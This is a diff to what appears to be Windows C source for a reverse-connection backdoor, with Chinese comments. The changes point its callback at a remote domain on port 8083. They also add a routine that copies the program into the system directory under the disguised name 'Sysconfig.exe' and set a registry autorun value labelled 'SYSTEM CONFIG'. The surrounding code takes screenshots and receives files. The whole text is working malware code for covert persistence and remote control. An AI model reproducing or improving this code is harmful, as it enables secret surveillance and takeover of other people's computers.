@@ -4,14 +4,17 @@
 #include <windows.h>
 #include <winable.h>
 #pragma comment(lib, "ws2_32.lib")
+
+/*
 #ifdef _MSC_VER  
 #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
 #endif
+*/
 
 #define MSG_LEN 1024
 
-char ServerAddr[] = "oo.xx.com"; //反弹连接的域名
 int ServerPort = 8083;  //连接的端口
+char ServerAddr[] = "test.s0nnet.com"; //反弹连接的域名
 int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);
 
 
@@ -71,6 +74,7 @@ int recvFile(SOCKET client, char *filename)
 		}
         WriteFile(hFile,recvBuf,len,&count,0);
     }
+	Sleep(500);
 	send(client,"RECV",5,0);
 	return 0;
 }
@@ -172,7 +176,7 @@ int CaptureImage(HWND hwnd, CHAR *dirPath, CHAR *filename)
     bi.biWidth = bmpScreen.bmWidth;
     bi.biHeight = bmpScreen.bmHeight;
     bi.biPlanes = 1;
-    bi.biBitCount = 16;
+    bi.biBitCount = 32;
     bi.biCompression = BI_RGB;
     bi.biSizeImage = 0;
     bi.biXPelsPerMeter = 0;
@@ -253,8 +257,9 @@ void c_socket()
 	struct in_addr addr;
 
 	int iResult = WSAStartup( MAKEWORD(2,2), &wsaData );
-	if ( iResult != NO_ERROR )
+	if ( iResult != NO_ERROR ) {
 			//printf("Error at WSAStartup()\n");
+	}
 	while(1){
 
 		//解析主机地址
@@ -290,8 +295,8 @@ void c_socket()
 	// 连接到服务器.
 	sockaddr_in clientService;
 	clientService.sin_family = AF_INET;
-	clientService.sin_addr.s_addr = inet_addr("192.168.10.233");
-	//clientService.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
+	//clientService.sin_addr.s_addr = inet_addr("10.0.0.4");
+	clientService.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
 	clientService.sin_port = htons(ServerPort);
 	while(1){
 		if ( connect( client, (SOCKADDR*) &clientService, sizeof(clientService) ) == SOCKET_ERROR) {
@@ -390,11 +395,23 @@ void c_socket()
     return;
 }
 
-int autoRun()
+//自身复制
+int copySelf(char *path)
+{
+	char fileName[MAX_PATH];
+	char sysPath[MAX_PATH];
+	GetModuleFileName(NULL,fileName, sizeof(fileName));
+	GetSystemDirectory(sysPath, sizeof(sysPath));
+	sprintf(path,"%s\\Sysconfig.exe",sysPath);
+	CopyFile(fileName, path, TRUE);
+
+	return 0;
+}
+
+int autoRun(char *path)
 {
     HKEY hKey;
     DWORD result;
-    char path[] = "C:\\Users\\WinLogin.exe"; // 要开机启动的程序
  
     //打开注册表
     result = RegOpenKeyEx(
@@ -410,7 +427,7 @@ int autoRun()
     // 在注册表中设置(没有则会新增一个值)
     result = RegSetValueEx(
                  hKey,
-                 "Registry Example", // 键名
+                 "SYSTEM CONFIG", // 键名
                  0,                  // 保留参数必须填 0
                  REG_SZ,             // 键值类型为字符串
                  (const unsigned char *)path, // 字符串首地址
@@ -421,12 +438,16 @@ int autoRun()
  
     //关闭注册表:
     RegCloseKey(hKey);
+
     return 0;
 }
 
 int main()
 {
-	autoRun();
+	char path[MAX_PATH];
+
+	copySelf(path);
+	autoRun(path);
 	c_socket();
 
 	return 0;
